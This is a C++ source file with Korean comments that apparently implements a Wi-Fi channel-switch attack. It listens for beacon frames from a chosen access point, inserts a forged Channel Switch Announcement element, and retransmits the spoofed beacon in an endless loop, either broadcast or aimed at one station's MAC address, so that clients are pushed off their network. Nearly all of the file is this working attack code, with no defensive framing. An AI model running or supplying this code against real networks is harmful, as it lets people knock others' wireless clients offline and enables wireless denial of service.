#include <iostream>
#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <sstream>
#include <cstring>
#include <iomanip>
#include <fstream>
#include <vector>
#include <thread>
#include <chrono>

struct ieee80211_radiotap_header {
	u_int8_t        it_version;     /* set to 0 */
	u_int8_t        it_pad;
	u_int16_t       it_len;         /* entire length */
} __attribute__((__packed__));

struct nextpresent{
	uint8_t flag;
	uint8_t datarate;
	uint16_t cf;
	uint16_t cflag;
	uint8_t pwr;
};

struct ieee80211_header {
	uint16_t frame_control;
	uint16_t duration_id;
	uint8_t desaddr[6];
	uint8_t sourceaddr4[6];
	uint8_t bssid[6];
	uint16_t sequence_control;
};

struct beacon_frame_fixed {
	uint8_t timestamp[8];
	uint8_t beacon_interval[2]; 
	uint8_t capabilities_info[2];
};

struct info_element {
	uint8_t id;
	uint8_t length;
	uint8_t data[];
};

struct beacon_frame {
	struct ieee80211_header header;
	struct beacon_frame_fixed fixed;
	struct info_element ie[];
};

struct tag_rsn{
	uint8_t rsnid;
	uint8_t rsnlength;
	uint16_t version;
	uint32_t GroupCipherss;
	uint16_t pairwisesc;
};

struct csa{
	uint8_t tag_number = 0x25;
	uint8_t tag_len = 0x03;
	uint8_t channelswitch = 0x01;
	uint8_t new_channel = 0x13;
	uint8_t channel_switch_count = 0x03;
};

void send_packet_with_inserted_csa(const std::string& dev, const u_char* packet, size_t packet_len,int offset) {
	struct csa csa_data;
    char errbuf[PCAP_ERRBUF_SIZE];
    size_t new_packet_len = packet_len + sizeof(struct csa);
    int insert_position = -1;
	uint8_t channel = 0x00;
    // pcap 핸들 열기
    pcap_t* sendhandle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (sendhandle == NULL) {
        std::cerr << "Couldn't open device " << dev << ": " << errbuf << std::endl;
        return;
    }

    // 패킷 순회하여 삽입 위치 찾기
    while (offset < packet_len) {
        struct info_element* ie = (struct info_element*)(packet + offset);
        int next_offset = offset + 2 + ie->length;
		if (ie->id == 3 && ie->length == 1) {
			channel = (ie->data[0]) * 2;
		}
		
        if (next_offset < packet_len) {
            struct info_element* next_ie = (struct info_element*)(packet + next_offset);
            if (ie->id <= 0x25 && next_ie->id > 0x25) {
                insert_position = next_offset;
				csa_data.new_channel = channel;
                break;
            }
        }
        offset = next_offset;
    }

    if (insert_position != -1) {
        std::vector<u_char> new_packet;
        new_packet.reserve(new_packet_len);
        // 패킷의 시작부터 삽입 위치까지 복사
        new_packet.insert(new_packet.end(), packet, packet + insert_position);
        // csa 구조체 삽입
        new_packet.insert(new_packet.end(), reinterpret_cast<u_char*>(&csa_data), reinterpret_cast<u_char*>(&csa_data) + sizeof(struct csa));
        // 나머지 부분 복사
        new_packet.insert(new_packet.end(), packet + insert_position, packet + packet_len);
        // 패킷 전송
        while (1) {
            if (pcap_sendpacket(sendhandle, new_packet.data(), new_packet_len) != 0) {
                std::cerr << "Error sending the packet: " << pcap_geterr(sendhandle) << std::endl;
            }
            std::cerr << "SEND" << std::endl;
        }
    } else {
        std::cout << "No suitable position for csa insertion found" << std::endl;
    }

    pcap_close(sendhandle);
}

void broadcast(char* adp,const u_char* packet,char* apmac,uint32_t caplen){
	uint8_t send[6];
	uint8_t des[6];
	int status = 0;

	//char* apMac에 저장되어 있는 Mac주소를 스트림으로 변환
	std::istringstream apMacStream(apmac);
	int value;
	char colon;

	for (int i = 0; i < 6; ++i) {
		if (!(apMacStream >> std::hex >> value)) {
			std::cerr << "MAC 주소 파싱 실패: 유효하지 않은 형식" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (i < 5 && !(apMacStream >> colon)) {
			std::cerr << "MAC 주소 파싱 실패: 구분자 오류" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (value < 0 || value > 255) {
			std::cerr << "MAC 주소 파싱 실패: 값 범위 초과" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		send[i] = static_cast<uint8_t>(value);
	}

	struct ieee80211_radiotap_header *rheader = (struct ieee80211_radiotap_header*)packet;
	struct beacon_frame *beacon = (struct beacon_frame*)(packet+(rheader->it_len));
	int x = packet[rheader->it_len];

	if(x != 0x80)
		return;

	for(int i =0;i<6;i++){
		if(send[i] != beacon->header.sourceaddr4[i])
			status++;
		break;
	}

	if(status != 0)
		return;

	int beacon_frame_offset = rheader->it_len + sizeof(struct ieee80211_header) + sizeof(struct beacon_frame_fixed);
	send_packet_with_inserted_csa(adp,packet,caplen,beacon_frame_offset);
}

void unicast(char* adp,const u_char* packet,char* apmac,uint32_t caplen,char* stationmac){
	uint8_t send[6];
	uint8_t des[6];
	int status = 0;

	//char* apMac에 저장되어 있는 Mac주소를 스트림으로 변환
	std::istringstream apMacStream(apmac);
	std::istringstream stationMacStream(stationmac);
	int value;
	char colon;

	for (int i = 0; i < 6; ++i) {
		if (!(apMacStream >> std::hex >> value)) {
			std::cerr << "MAC 주소 파싱 실패: 유효하지 않은 형식" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (i < 5 && !(apMacStream >> colon)) {
			std::cerr << "MAC 주소 파싱 실패: 구분자 오류" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (value < 0 || value > 255) {
			std::cerr << "MAC 주소 파싱 실패: 값 범위 초과" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		send[i] = static_cast<uint8_t>(value);
	}

	value = 0;
	colon = 0;

	for (int i = 0; i < 6; ++i) {
		if (!(stationMacStream >> std::hex >> value)) {
			std::cerr << "MAC 주소 파싱 실패: 유효하지 않은 형식" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (i < 5 && !(stationMacStream >> colon)) {
			std::cerr << "MAC 주소 파싱 실패: 구분자 오류" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		if (value < 0 || value > 255) {
			std::cerr << "MAC 주소 파싱 실패: 값 범위 초과" << std::endl;
			exit(EXIT_FAILURE); // 또는 적절한 에러 처리
		}
		des[i] = static_cast<uint8_t>(value);
	}

	struct ieee80211_radiotap_header *rheader = (struct ieee80211_radiotap_header*)packet;
	struct beacon_frame *beacon = (struct beacon_frame*)(packet+(rheader->it_len));
	int x = packet[rheader->it_len];

	if(x != 0x80)
		return;

	for(int i =0;i<6;i++){
		if(send[i] != beacon->header.sourceaddr4[i])
			status++;
		break;
	}

	if(status != 0)
		return;

	std::vector<u_char> new_packet;
    new_packet.reserve(caplen);

    // 패킷의 radiotap 헤더 복사
    new_packet.insert(new_packet.end(), packet, packet + rheader->it_len);

    // beacon_frame 복사 및 desaddr 변경
    struct beacon_frame new_beacon_frame = *beacon;
    memcpy(new_beacon_frame.header.desaddr, des, 6);

    // 새로운 beacon_frame 추가
    const u_char* beacon_ptr = reinterpret_cast<const u_char*>(&new_beacon_frame);
    new_packet.insert(new_packet.end(), beacon_ptr, beacon_ptr + sizeof(new_beacon_frame));

    // 나머지 패킷 데이터 추가
    size_t beacon_end_offset = rheader->it_len + sizeof(new_beacon_frame);
    new_packet.insert(new_packet.end(), packet + beacon_end_offset, packet + caplen);

    // 변경된 패킷 전송
    int beacon_frame_offset = rheader->it_len + sizeof(struct ieee80211_header) + sizeof(struct beacon_frame_fixed);
    send_packet_with_inserted_csa(adp, new_packet.data(), new_packet.size(), beacon_frame_offset);
}